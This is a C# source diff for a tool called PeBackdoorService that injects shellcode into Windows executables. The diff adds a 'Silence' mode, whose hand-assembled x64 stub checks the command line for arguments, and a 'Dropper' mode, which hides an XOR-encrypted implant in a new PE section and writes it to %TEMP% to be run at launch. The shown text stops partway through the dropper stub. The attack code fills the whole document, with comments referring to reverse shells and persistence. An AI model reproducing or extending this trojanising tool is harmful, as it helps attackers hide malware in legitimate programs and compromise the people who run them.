@@ -203,27 +203,39 @@ public sealed class PeBackdoorService
                 result.ErrorMessage = $"Target PE file not found: {options.TargetPePath}";
                 return result;
             }
-            if (!File.Exists(options.ShellcodePath))
+            // Dropper mode uses an implant EXE rather than raw shellcode.
+            byte[] shellcode;
+            if (options.Mode == BackdoorMode.Dropper)
             {
-                result.ErrorMessage = $"Shellcode file not found: {options.ShellcodePath}";
-                return result;
+                shellcode = Array.Empty<byte>();
             }
-
-            var shellcode = await File.ReadAllBytesAsync(options.ShellcodePath);
-            if (shellcode.Length == 0)
+            else
             {
-                result.ErrorMessage = "Shellcode file is empty";
-                return result;
+                if (!File.Exists(options.ShellcodePath))
+                {
+                    result.ErrorMessage = $"Shellcode file not found: {options.ShellcodePath}";
+                    return result;
+                }
+                shellcode = await File.ReadAllBytesAsync(options.ShellcodePath);
+                if (shellcode.Length == 0)
+                {
+                    result.ErrorMessage = "Shellcode file is empty";
+                    return result;
+                }
+                result.ShellcodeSize = shellcode.Length;
+                result.Steps.Add($"Loaded shellcode: {shellcode.Length} bytes from {Path.GetFileName(options.ShellcodePath)}");
+                _logger.Info($"Loaded shellcode: {shellcode.Length} bytes");
             }
-            result.ShellcodeSize = shellcode.Length;
-            result.Steps.Add($"Loaded shellcode: {shellcode.Length} bytes from {Path.GetFileName(options.ShellcodePath)}");
-            _logger.Info($"Loaded shellcode: {shellcode.Length} bytes");
 
             // ── Parse PE ─────────────────────────────────────────────
             var peData = await File.ReadAllBytesAsync(options.TargetPePath);
             var pe = ParsePe(peData);
             result.Steps.Add($"Parsed PE: {(pe.Is64Bit ? "x64" : "x86")} {(pe.IsDll ? "DLL" : "EXE")}, {pe.NumberOfSections} sections");
             _logger.Info($"Target: {(pe.Is64Bit ? "x64" : "x86")} {(pe.IsDll ? "DLL" : "EXE")}");
+
+            // Dropper mode has its own injection pipeline — bypass shellcode validation.
+            if (options.Mode == BackdoorMode.Dropper)
+                return await BackdoorDropperAsync(options, peData, pe, result);
 
             // ── Pre-flight validation ────────────────────────────────
             var issues = ValidateForInjection(pe, shellcode, options);
@@ -268,16 +280,30 @@ public sealed class PeBackdoorService
             }
 
             // ── Build injection payload ──────────────────────────────
+            // Normal mode: host and implant both run every launch — warn about persistence.
+            if (options.Mode == BackdoorMode.Normal)
+                result.Warnings.Add("Normal mode: host binary and implant both execute on every launch — incompatible with persistence snippets.");
+
             // Use threaded payload (CreateThread) for x64 to handle shellcode that
             // calls ExitProcess or never returns (reverse shells, etc).
+            // Silence mode uses a command-line check to suppress the host when args are present.
             // Falls back to inline CALL for x86.
             int jmpOffsetInPayload;
             byte[] fullPayload;
             if (pe.Is64Bit && options.Encryption == PayloadEncryption.None)
             {
-                fullPayload = BuildThreadedPayload(payload, pe.Is64Bit, out jmpOffsetInPayload);
-                int stubOverhead = fullPayload.Length - payload.Length;
-                result.Steps.Add($"Built threaded payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub)");
+                if (options.Mode == BackdoorMode.Silence)
+                {
+                    fullPayload = BuildSilencePayload(payload, out jmpOffsetInPayload);
+                    int stubOverhead = fullPayload.Length - payload.Length;
+                    result.Steps.Add($"Built silence payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub)");
+                }
+                else
+                {
+                    fullPayload = BuildThreadedPayload(payload, pe.Is64Bit, out jmpOffsetInPayload);
+                    int stubOverhead = fullPayload.Length - payload.Length;
+                    result.Steps.Add($"Built threaded payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub)");
+                }
             }
             else
             {
@@ -786,6 +812,659 @@ public sealed class PeBackdoorService
         return bytes;
     }
 
+    // ─────────────────────────────────────────────────────────────────────
+    //  BuildSilencePayload — Silence mode (x64 only)
+    //
+    //  Layout: [prologue: cmdline space-scan] [normal_path: CreateThread stub]
+    //          [EB → JMP_OEP] [silence_path: call shellcode + spin]
+    //          [JMP_OEP: E9] [shellcode]
+    //
+    //  - No args  → normal_path runs; CreateThread(shellcode); host continues normally.
+    //  - Any arg  → silence_path runs; shellcode called inline; host spins (suppressed).
+    // ─────────────────────────────────────────────────────────────────────
+    private byte[] BuildSilencePayload(byte[] shellcode, out int jmpOffsetInPayload)
+    {
+        var buf = new List<byte>();
+
+        // ═══ [Prologue: scan PEB CommandLine for a space (= argument present)] ═
+        // push rax, rcx, rdx, rsi
+        buf.AddRange(new byte[] { 0x50, 0x51, 0x52, 0x56 });
+        // xor rcx, rcx
+        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
+        // mov rax, gs:[rcx+0x60]  (PEB)
+        buf.AddRange(new byte[] { 0x65, 0x48, 0x8B, 0x41, 0x60 });
+        // mov rax, [rax+0x20]     (ProcessParameters)
+        buf.AddRange(new byte[] { 0x48, 0x8B, 0x40, 0x20 });
+        // movzx edx, word [rax+0x70]  (CommandLine.Length in bytes)
+        buf.AddRange(new byte[] { 0x0F, 0xB7, 0x50, 0x70 });
+        // shr edx, 1               (→ chars)
+        buf.AddRange(new byte[] { 0xD1, 0xEA });
+        // mov rsi, [rax+0x78]      (CommandLine.Buffer; rcx=0 = loop index)
+        buf.AddRange(new byte[] { 0x48, 0x8B, 0x70, 0x78 });
+
+        // check_loop:
+        int checkLoopPos = buf.Count;
+        // cmp ecx, edx
+        buf.AddRange(new byte[] { 0x3B, 0xCA });
+        int jgeNoArgPos = buf.Count;
+        buf.AddRange(new byte[] { 0x7D, 0x00 });                               // jge no_arg (patch later)
+        // movzx eax, word [rsi+rcx*2]  (SIB: scale=1 idx=RCX base=RSI → 0x4E)
+        buf.AddRange(new byte[] { 0x0F, 0xB7, 0x04, 0x4E });
+        // cmp ax, 0x20
+        buf.AddRange(new byte[] { 0x66, 0x83, 0xF8, 0x20 });
+        int jeFoundArgPos = buf.Count;
+        buf.AddRange(new byte[] { 0x74, 0x00 });                               // je found_arg (patch later)
+        // inc ecx
+        buf.AddRange(new byte[] { 0xFF, 0xC1 });
+        int jmpCheckLoopPos = buf.Count;
+        buf.AddRange(new byte[] { 0xEB, 0x00 });                               // jmp check_loop (patch later)
+
+        // found_arg: (space found → silence path)
+        int foundArgPos = buf.Count;
+        // pop rsi, rdx, rcx, rax
+        buf.AddRange(new byte[] { 0x5E, 0x5A, 0x59, 0x58 });
+        int jmpToSilencePos = buf.Count;
+        buf.Add(0xE9);
+        buf.AddRange(new byte[4]);                                              // jmp silence_path (near, patch later)
+
+        // no_arg: (no space → normal path)
+        int noArgPos = buf.Count;
+        // pop rsi, rdx, rcx, rax
+        buf.AddRange(new byte[] { 0x5E, 0x5A, 0x59, 0x58 });
+        // fall through to normal_path
+
+        // ═══ [normal_path: CreateThread stub — verbatim copy of BuildThreadedPayload] ═
+        buf.AddRange(X64SaveRegs);
+        buf.AddRange(X64Kernel32PebWalk);
+
+        // Export directory parse
+        buf.AddRange(new byte[] { 0x8B, 0x43, 0x3C });
+        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });
+        buf.AddRange(new byte[] { 0x44, 0x8B, 0xA0, 0x88, 0x00, 0x00, 0x00 });
+        buf.AddRange(new byte[] { 0x49, 0x01, 0xDC });
+
+        // Search setup
+        buf.AddRange(new byte[] { 0x41, 0x8B, 0x4C, 0x24, 0x18 });
+        buf.AddRange(new byte[] { 0x45, 0x8B, 0x54, 0x24, 0x20 });
+        buf.AddRange(new byte[] { 0x49, 0x01, 0xDA });
+        buf.AddRange(new byte[] { 0x45, 0x31, 0xDB });
+
+        int ctSearchLoopPos = buf.Count;
+        buf.AddRange(new byte[] { 0x43, 0x8B, 0x34, 0x9A });
+        buf.AddRange(new byte[] { 0x48, 0x01, 0xDE });
+        buf.AddRange(new byte[] { 0x81, 0x3E, 0x43, 0x72, 0x65, 0x61 });       // "Crea"
+        int ctJneNext1 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });
+        buf.AddRange(new byte[] { 0x81, 0x7E, 0x04, 0x74, 0x65, 0x54, 0x68 }); // "teTh"
+        int ctJneNext2 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });
+        buf.AddRange(new byte[] { 0x81, 0x7E, 0x08, 0x72, 0x65, 0x61, 0x64 }); // "read"
+        int ctJneNext3 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });
+        buf.AddRange(new byte[] { 0x80, 0x7E, 0x0C, 0x00 });
+        int ctJneNext4 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });
+        int ctJmpFound = buf.Count; buf.AddRange(new byte[] { 0xEB, 0x00 });
+
+        int ctNextNamePos = buf.Count;
+        buf.AddRange(new byte[] { 0x41, 0xFF, 0xC3 });
+        buf.AddRange(new byte[] { 0x41, 0x39, 0xCB });
+        int ctJlSearch = buf.Count; buf.AddRange(new byte[] { 0x7C, 0x00 });
+        int ctJmpSkip  = buf.Count; buf.AddRange(new byte[] { 0xEB, 0x00 });
+
+        int ctFoundPos = buf.Count;
+        buf.AddRange(new byte[] { 0x41, 0x8B, 0x44, 0x24, 0x24 });
+        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });
+        buf.AddRange(new byte[] { 0x42, 0x0F, 0xB7, 0x04, 0x58 });
+        buf.AddRange(new byte[] { 0x41, 0x8B, 0x54, 0x24, 0x1C });
+        buf.AddRange(new byte[] { 0x48, 0x01, 0xDA });
+        buf.AddRange(new byte[] { 0x8B, 0x04, 0x82 });
+        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });
+
+        // CreateThread call with ABI alignment
+        buf.AddRange(new byte[] { 0x4D, 0x31, 0xC9 });
+        buf.AddRange(new byte[] { 0x48, 0x89, 0xE5 });
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xE4, 0xF0 });
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x30 });
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0x4C, 0x24, 0x28 });
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0x4C, 0x24, 0x20 });
+        int ctLeaR8Pos = buf.Count;
+        buf.AddRange(new byte[] { 0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00 }); // lea r8, [rip+??]
+        buf.AddRange(new byte[] { 0x48, 0x31, 0xD2 });
+        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
+        buf.AddRange(new byte[] { 0xFF, 0xD0 });
+        buf.AddRange(new byte[] { 0x48, 0x89, 0xEC });
+
+        int ctSkipPos = buf.Count;
+        buf.AddRange(X64RestoreRegs);
+
+        // Short jump past silence_path to JMP_OEP
+        int jmpToOepShortPos = buf.Count;
+        buf.AddRange(new byte[] { 0xEB, 0x00 });                               // patch later
+
+        // ═══ [silence_path: call shellcode inline, then spin] ═══════════
+        int silencePathPos = buf.Count;
+        buf.AddRange(X64SaveRegs);
+        // E8 [rel32] — CALL shellcode (relative to next instruction)
+        // shellcode is at: silencePathPos + 28(SaveRegs) + 5(this E8) = silencePathPos + 33
+        // But we'll compute the disp32 after fixing the shellcode position.
+        int callScPos = buf.Count;
+        buf.Add(0xE8);
+        buf.AddRange(new byte[4]);                                              // patch later
+        buf.AddRange(X64RestoreRegs);
+        // EB FE — infinite spin (host process suppressed)
+        buf.AddRange(new byte[] { 0xEB, 0xFE });
+
+        // ═══ [JMP OEP placeholder] ═══════════════════════════════════════
+        int jmpOepPos = buf.Count;
+        buf.Add(0xE9);
+        buf.AddRange(new byte[4]);
+
+        // ═══ [Shellcode] ═════════════════════════════════════════════════
+        int shellcodePos = buf.Count;
+        buf.AddRange(shellcode);
+
+        // ─── Patch all offsets ───────────────────────────────────────────
+        var bytes = buf.ToArray();
+
+        // Prologue jumps
+        bytes[jgeNoArgPos  + 1] = (byte)(noArgPos    - (jgeNoArgPos  + 2));
+        bytes[jeFoundArgPos + 1] = (byte)(foundArgPos - (jeFoundArgPos + 2));
+        bytes[jmpCheckLoopPos + 1] = unchecked((byte)(checkLoopPos - (jmpCheckLoopPos + 2)));
+        // near JMP to silence_path
+        int silenceRel = silencePathPos - (jmpToSilencePos + 5);
+        BitConverter.GetBytes(silenceRel).CopyTo(bytes, jmpToSilencePos + 1);
+        // CreateThread inner jumps
+        bytes[ctJneNext1 + 1] = (byte)(ctNextNamePos - (ctJneNext1 + 2));
+        bytes[ctJneNext2 + 1] = (byte)(ctNextNamePos - (ctJneNext2 + 2));
+        bytes[ctJneNext3 + 1] = (byte)(ctNextNamePos - (ctJneNext3 + 2));
+        bytes[ctJneNext4 + 1] = (byte)(ctNextNamePos - (ctJneNext4 + 2));
+        bytes[ctJmpFound  + 1] = (byte)(ctFoundPos   - (ctJmpFound  + 2));
+        bytes[ctJlSearch  + 1] = unchecked((byte)(ctSearchLoopPos - (ctJlSearch + 2)));
+        bytes[ctJmpSkip   + 1] = (byte)(ctSkipPos    - (ctJmpSkip  + 2));
+        // lea r8, [rip + shellcode]
+        int ctLeaDisp = shellcodePos - (ctLeaR8Pos + 7);
+        BitConverter.GetBytes(ctLeaDisp).CopyTo(bytes, ctLeaR8Pos + 3);
+        // Short jump from end of normal_path over silence_path to JMP_OEP
+        bytes[jmpToOepShortPos + 1] = (byte)(jmpOepPos - (jmpToOepShortPos + 2));
+        // CALL shellcode from silence_path
+        int callScDisp = shellcodePos - (callScPos + 5);
+        BitConverter.GetBytes(callScDisp).CopyTo(bytes, callScPos + 1);
+
+        jmpOffsetInPayload = jmpOepPos;
+        return bytes;
+    }
+
+    // ─────────────────────────────────────────────────────────────────────
+    //  AppendDplSection — Dropper mode
+    //
+    //  Appends an XOR-encrypted implant EXE as a read/write (non-exec) section
+    //  named ".dpl". The dropper stub will XOR-decrypt and CreateProcess it
+    //  from %TEMP% at runtime.
+    // ─────────────────────────────────────────────────────────────────────
+    private (byte[] newData, uint dplRva, uint dplSize) AppendDplSection(
+        byte[] peData, ParsedPe pe, byte[] encryptedImplant)
+    {
+        const uint SCN_MEM_READ  = 0x40000000;
+        const uint SCN_MEM_WRITE = 0x80000000;
+        const uint SCN_CNT_DATA  = 0x00000040;
+        const uint dplChars = SCN_MEM_READ | SCN_MEM_WRITE | SCN_CNT_DATA;  // 0xC0000040
+
+        // Verify there is room for one more section header.
+        int lastHeaderOffset = (int)pe.SectionHeadersFileOffset + (pe.NumberOfSections - 1) * 40;
+        int newHeaderOffset  = lastHeaderOffset + 40;
+        if (newHeaderOffset + 40 > (int)pe.SizeOfHeaders)
+            throw new InvalidOperationException("No room in PE header for an additional section (.dpl). Use a PE with larger header padding.");
+
+        uint fileAlign = pe.FileAlignment;
+        uint sectAlign = pe.SectionAlignment;
+
+        // Compute new section layout following the last existing section.
+        var lastSect = pe.Sections[pe.Sections.Count - 1];
+        uint lastVa  = lastSect.VirtualAddress + Math.Max(lastSect.VirtualSize, lastSect.RawSize);
+        uint newRva  = AlignUp(lastVa, sectAlign);
+        uint rawSize = AlignUp((uint)encryptedImplant.Length, fileAlign);
+        uint rawOffset = AlignUp(lastSect.RawAddress + lastSect.RawSize, fileAlign);
+
+        // Extend file.
+        var newData = new byte[rawOffset + rawSize];
+        Buffer.BlockCopy(peData, 0, newData, 0, peData.Length);
+        Buffer.BlockCopy(encryptedImplant, 0, newData, (int)rawOffset, encryptedImplant.Length);
+
+        // Update NumberOfSections (+1).
+        int numSecOffset = (int)pe.NumberOfSectionsFileOffset;
+        BitConverter.GetBytes((ushort)(pe.NumberOfSections + 1)).CopyTo(newData, numSecOffset);
+
+        // Update SizeOfImage.
+        uint newSizeOfImage = AlignUp(newRva + (uint)encryptedImplant.Length, sectAlign);
+        BitConverter.GetBytes(newSizeOfImage).CopyTo(newData, (int)pe.SizeOfImageFieldFileOffset);
+
+        // Write 40-byte section header.
+        // Name: ".dpl\0\0\0\0"
+        newData[newHeaderOffset + 0] = 0x2E; // '.'
+        newData[newHeaderOffset + 1] = 0x64; // 'd'
+        newData[newHeaderOffset + 2] = 0x70; // 'p'
+        newData[newHeaderOffset + 3] = 0x6C; // 'l'
+        // bytes 4-7 already zero (BlockCopy from zeroed array)
+        // VirtualSize
+        BitConverter.GetBytes((uint)encryptedImplant.Length).CopyTo(newData, newHeaderOffset + 8);
+        // VirtualAddress
+        BitConverter.GetBytes(newRva).CopyTo(newData, newHeaderOffset + 12);
+        // SizeOfRawData
+        BitConverter.GetBytes(rawSize).CopyTo(newData, newHeaderOffset + 16);
+        // PointerToRawData
+        BitConverter.GetBytes(rawOffset).CopyTo(newData, newHeaderOffset + 20);
+        // PointerToRelocations, PointerToLinenumbers, counts → already zero
+        // Characteristics
+        BitConverter.GetBytes(dplChars).CopyTo(newData, newHeaderOffset + 36);
+
+        return (newData, newRva, (uint)encryptedImplant.Length);
+    }
+
+    // ─────────────────────────────────────────────────────────────────────
+    //  BuildDropperPayload — Dropper mode (x64 only)
+    //
+    //  PIC x64 stub that:
+    //    1. Finds kernel32 via PEB walk.
+    //    2. Finds GetProcAddress by name scan.
+    //    3. XOR-decrypts the .dpl section in-place (using runtime ImageBase from PEB).
+    //    4. Resolves GetTempPathW / CreateFileW / WriteFile / CloseHandle / CreateProcessW.
+    //    5. Writes the decrypted implant to %TEMP%\~dpl.exe and CreateProcess it.
+    //    6. JMPs to the original OEP so the host continues running.
+    // ─────────────────────────────────────────────────────────────────────
+    private byte[] BuildDropperPayload(uint dplRva, uint dplSize, byte xorKey)
+    {
+        var buf = new List<byte>();
+
+        // ── Frame slot constants (relative to frame_base = RSP after X64SaveRegs + sub 0x288) ──
+        const int SLOT_GTP  = 0x00; // GetTempPathW   fn ptr
+        const int SLOT_CFW  = 0x08; // CreateFileW    fn ptr
+        const int SLOT_WF   = 0x10; // WriteFile      fn ptr
+        const int SLOT_CH   = 0x18; // CloseHandle    fn ptr
+        const int SLOT_CPW  = 0x20; // CreateProcessW fn ptr
+        const int SLOT_HFILE = 0x28; // HANDLE hFile (output from CreateFileW)
+        // 0x30 = BytesWritten DWORD (used as &bw for WriteFile)
+        // 0x40..0x13F = path buffer (128 WCHARs)
+        // 0x140..0x1A7 = STARTUPINFOW (104 bytes)
+        // 0x1A8..0x1BF = PROCESS_INFORMATION (24 bytes)
+
+        // ── [Save registers + allocate frame] ────────────────────────────
+        buf.AddRange(X64SaveRegs);                                              // 28 bytes
+        // sub rsp, 0x288
+        buf.AddRange(new byte[] { 0x48, 0x81, 0xEC, 0x88, 0x02, 0x00, 0x00 }); // 7 bytes
+
+        // ── [Get ImageBase from PEB → R14] ───────────────────────────────
+        // xor rcx, rcx
+        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
+        // mov rax, gs:[rcx+0x60]  (PEB)
+        buf.AddRange(new byte[] { 0x65, 0x48, 0x8B, 0x41, 0x60 });
+        // mov r14, [rax+0x10]     (PEB.ImageBaseAddress)  — REX=4C W+R, ModRM=70 mod01 r14_lo=6 rax=0
+        buf.AddRange(new byte[] { 0x4C, 0x8B, 0x70, 0x10 });
+
+        // ── [PEB walk: kernel32 base → RBX] ─────────────────────────────
+        buf.AddRange(X64Kernel32PebWalk);                                       // 26 bytes (clobbers rax/rsi)
+
+        // ── [Export directory parse] ─────────────────────────────────────
+        buf.AddRange(new byte[] { 0x8B, 0x43, 0x3C });                         // mov eax, [rbx+0x3C]
+        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx
+        buf.AddRange(new byte[] { 0x44, 0x8B, 0xA0, 0x88, 0x00, 0x00, 0x00 }); // mov r12d, [rax+0x88]
+        buf.AddRange(new byte[] { 0x49, 0x01, 0xDC });                         // add r12, rbx
+
+        // ── [Search setup] ───────────────────────────────────────────────
+        buf.AddRange(new byte[] { 0x41, 0x8B, 0x4C, 0x24, 0x18 });             // mov ecx, [r12+0x18] NumberOfNames
+        buf.AddRange(new byte[] { 0x45, 0x8B, 0x54, 0x24, 0x20 });             // mov r10d, [r12+0x20] AddressOfNames RVA
+        buf.AddRange(new byte[] { 0x49, 0x01, 0xDA });                         // add r10, rbx
+        buf.AddRange(new byte[] { 0x45, 0x31, 0xDB });                         // xor r11d, r11d  (index=0)
+
+        // ── [GPA search loop: find "GetProcAddress"] ─────────────────────
+        int gpaLoopPos = buf.Count;
+        buf.AddRange(new byte[] { 0x43, 0x8B, 0x34, 0x9A });                   // mov esi, [r10+r11*4]
+        buf.AddRange(new byte[] { 0x48, 0x01, 0xDE });                         // add rsi, rbx
+        // cmp dword [rsi], "GetP" (0x50746547)
+        buf.AddRange(new byte[] { 0x81, 0x3E, 0x47, 0x65, 0x74, 0x50 });
+        int gpa1 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });         // jne gpaNext
+        // cmp dword [rsi+4], "rocA" (0x41636F72)
+        buf.AddRange(new byte[] { 0x81, 0x7E, 0x04, 0x72, 0x6F, 0x63, 0x41 });
+        int gpa2 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });         // jne gpaNext
+        // cmp dword [rsi+8], "ddre" (0x65726464)
+        buf.AddRange(new byte[] { 0x81, 0x7E, 0x08, 0x64, 0x64, 0x72, 0x65 });
+        int gpa3 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });         // jne gpaNext
+        // cmp byte [rsi+14], 0  (null terminator confirms "GetProcAddress\0")
+        buf.AddRange(new byte[] { 0x80, 0x7E, 0x0E, 0x00 });
+        int gpa4 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });         // jne gpaNext
+        int gpaJmpFound = buf.Count; buf.AddRange(new byte[] { 0xEB, 0x00 });  // jmp gpaFound
+
+        int gpaNextPos = buf.Count;
+        buf.AddRange(new byte[] { 0x41, 0xFF, 0xC3 });                         // inc r11d
+        buf.AddRange(new byte[] { 0x41, 0x39, 0xCB });                         // cmp r11d, ecx
+        int gpaJl = buf.Count; buf.AddRange(new byte[] { 0x7C, 0x00 });        // jl gpaLoop
+        int gpaJmpSkip = buf.Count; buf.AddRange(new byte[] { 0xEB, 0x00 });   // jmp gpaSkip (not found)
+
+        int gpaFoundPos = buf.Count;
+        buf.AddRange(new byte[] { 0x41, 0x8B, 0x44, 0x24, 0x24 });             // mov eax, [r12+0x24]  ordinals RVA
+        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx
+        buf.AddRange(new byte[] { 0x42, 0x0F, 0xB7, 0x04, 0x58 });             // movzx eax, word [rax+r11*2]
+        buf.AddRange(new byte[] { 0x41, 0x8B, 0x54, 0x24, 0x1C });             // mov edx, [r12+0x1C]  functions RVA
+        buf.AddRange(new byte[] { 0x48, 0x01, 0xDA });                         // add rdx, rbx
+        buf.AddRange(new byte[] { 0x8B, 0x04, 0x82 });                         // mov eax, [rdx+rax*4]
+        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx
+        // mov r15, rax  (R15 = GetProcAddress VA)  REX=49 W+B, opcode 89, ModRM C7
+        buf.AddRange(new byte[] { 0x49, 0x89, 0xC7 });
+
+        // gpaSkip: (fall-through from gpaFoundPos, or jmp here if not found)
+        int gpaSkipPos = buf.Count;
+
+        // Patch GPA search jumps
+        var tempBytes = buf.ToArray();
+        tempBytes[gpa1 + 1] = (byte)(gpaNextPos - (gpa1 + 2));
+        tempBytes[gpa2 + 1] = (byte)(gpaNextPos - (gpa2 + 2));
+        tempBytes[gpa3 + 1] = (byte)(gpaNextPos - (gpa3 + 2));
+        tempBytes[gpa4 + 1] = (byte)(gpaNextPos - (gpa4 + 2));
+        tempBytes[gpaJmpFound + 1] = (byte)(gpaFoundPos - (gpaJmpFound + 2));
+        tempBytes[gpaJl + 1] = unchecked((byte)(gpaLoopPos - (gpaJl + 2)));
+        tempBytes[gpaJmpSkip + 1] = (byte)(gpaSkipPos - (gpaJmpSkip + 2));
+        buf.Clear();
+        buf.AddRange(tempBytes);
+
+        // ── [Set R13 = runtime VA of .dpl section] ───────────────────────
+        // mov r13, r14   (R13 = ImageBase)  REX=4D W+R+B, 89, ModRM F5
+        buf.AddRange(new byte[] { 0x4D, 0x89, 0xF5 });
+        // add r13, dplRva  (48-bit add; REX=49 W+B, 81 /0, ModRM C5 mod11 /0 R13_lo=5)
+        buf.AddRange(new byte[] { 0x49, 0x81, 0xC5 });
+        buf.AddRange(BitConverter.GetBytes(dplRva));
+
+        // ── [XOR decrypt .dpl in-place] ──────────────────────────────────
+        // xor rcx, rcx  (loop index)
+        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
+        int xorLoopPos = buf.Count;
+        // xor byte [r13 + rcx*1 + 0], xorKey
+        // REX.B=1 for R13, opcode 80 /6 (XOR), ModRM=74 mod01 /6 SIB=4, SIB=0D scale0 RCX idx R13_lo base, disp8=0
+        buf.AddRange(new byte[] { 0x41, 0x80, 0x74, 0x0D, 0x00, xorKey });
+        // inc rcx
+        buf.AddRange(new byte[] { 0x48, 0xFF, 0xC1 });
+        // cmp ecx, dplSize
+        buf.AddRange(new byte[] { 0x81, 0xF9 });
+        buf.AddRange(BitConverter.GetBytes(dplSize));
+        int xorJlPos = buf.Count;
+        buf.AddRange(new byte[] { 0x7C, 0x00 });                               // jl xorLoop (patch later)
+
+        // ── [Resolve 5 Win32 APIs via GetProcAddress] ────────────────────
+        // Helper: EmitResolveApi — emits: mov rcx, rbx; E8 [len] [name\0]; pop rdx; call r15; mov [rsp+slot], rax
+        void ResolveApi(string name, int slot)
+        {
+            byte[] nameBytes = System.Text.Encoding.ASCII.GetBytes(name + "\0");
+            // mov rcx, rbx  (arg1 = kernel32 module handle)
+            buf.AddRange(new byte[] { 0x48, 0x89, 0xD9 });
+            // E8 [disp32=len(nameBytes)] [nameBytes]  (CALL/POP trick — pushes &name onto stack)
+            buf.Add(0xE8);
+            buf.AddRange(BitConverter.GetBytes(nameBytes.Length));
+            buf.AddRange(nameBytes);
+            // pop rdx  (arg2 = &name string)
+            buf.Add(0x5A);
+            // call r15  (GetProcAddress; REX.B=1 FF /2 ModRM D7)
+            buf.AddRange(new byte[] { 0x41, 0xFF, 0xD7 });
+            // mov [rsp+slot], rax  (store fn ptr)
+            if (slot < 128)
+                buf.AddRange(new byte[] { 0x48, 0x89, 0x44, 0x24, (byte)slot });
+            else
+            {
+                buf.AddRange(new byte[] { 0x48, 0x89, 0x84, 0x24 });
+                buf.AddRange(BitConverter.GetBytes(slot));
+            }
+        }
+
+        ResolveApi("GetTempPathW",   SLOT_GTP);
+        ResolveApi("CreateFileW",    SLOT_CFW);
+        ResolveApi("WriteFile",      SLOT_WF);
+        ResolveApi("CloseHandle",    SLOT_CH);
+        ResolveApi("CreateProcessW", SLOT_CPW);
+
+        // ── [GetTempPathW(128, &pathBuf)] ────────────────────────────────
+        // Load fn ptr BEFORE sub rsp
+        // mov rax, [rsp+SLOT_GTP]
+        buf.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, SLOT_GTP });
+        // sub rsp, 0x20  (shadow space for CALL)
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x20 });
+        // mov ecx, 128  (nBufferLength)
+        buf.AddRange(new byte[] { 0xB9, 0x80, 0x00, 0x00, 0x00 });
+        // lea rdx, [rsp+0x60]  (lpBuffer; frame_base+0x40 = rsp+0x20+0x40 = rsp+0x60; 0x60<128 → disp8)
+        buf.AddRange(new byte[] { 0x48, 0x8D, 0x54, 0x24, 0x60 });
+        // call rax
+        buf.AddRange(new byte[] { 0xFF, 0xD0 });
+        // add rsp, 0x20
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x20 });
+        // rax = char count (not null-terminated position in bytes)
+
+        // ── [Append L"~dpl.exe\0" to path] ──────────────────────────────
+        // shl rax, 1  (chars → bytes offset to null terminator)
+        buf.AddRange(new byte[] { 0x48, 0xD1, 0xE0 });
+        // lea rcx, [rsp+0x40]  (pathBuf base; 0x40=64 < 128 → disp8)
+        buf.AddRange(new byte[] { 0x48, 0x8D, 0x4C, 0x24, 0x40 });
+        // add rcx, rax  (rcx → existing null position)
+        buf.AddRange(new byte[] { 0x48, 0x01, 0xC1 });
+        // mov rax, L"~dpl"  (8 bytes: 7E 00 64 00 70 00 6C 00)
+        buf.AddRange(new byte[] { 0x48, 0xB8, 0x7E, 0x00, 0x64, 0x00, 0x70, 0x00, 0x6C, 0x00 });
+        // mov [rcx], rax
+        buf.AddRange(new byte[] { 0x48, 0x89, 0x01 });
+        // mov rax, L".exe"  (8 bytes: 2E 00 65 00 78 00 65 00)
+        buf.AddRange(new byte[] { 0x48, 0xB8, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00 });
+        // mov [rcx+8], rax
+        buf.AddRange(new byte[] { 0x48, 0x89, 0x41, 0x08 });
+        // mov word [rcx+16], 0  (null terminator)
+        buf.AddRange(new byte[] { 0x66, 0xC7, 0x41, 0x10, 0x00, 0x00 });
+
+        // ── [CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, NORMAL, NULL)] ──
+        // mov rax, [rsp+SLOT_CFW]
+        buf.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, SLOT_CFW });
+        // sub rsp, 0x40  (shadow(0x20) + 3 stack args(0x18) + align(0x8))
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x40 });
+        // arg7 hTemplate=NULL: xor rcx,rcx; mov [rsp+0x30],rcx
+        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
+        buf.AddRange(new byte[] { 0x48, 0x89, 0x4C, 0x24, 0x30 });
+        // arg6 dwFlagsAndAttributes=0x80 (FILE_ATTRIBUTE_NORMAL): mov r8d, 0x80; mov [rsp+0x28],r8
+        buf.AddRange(new byte[] { 0x41, 0xB8, 0x80, 0x00, 0x00, 0x00 });
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0x44, 0x24, 0x28 });
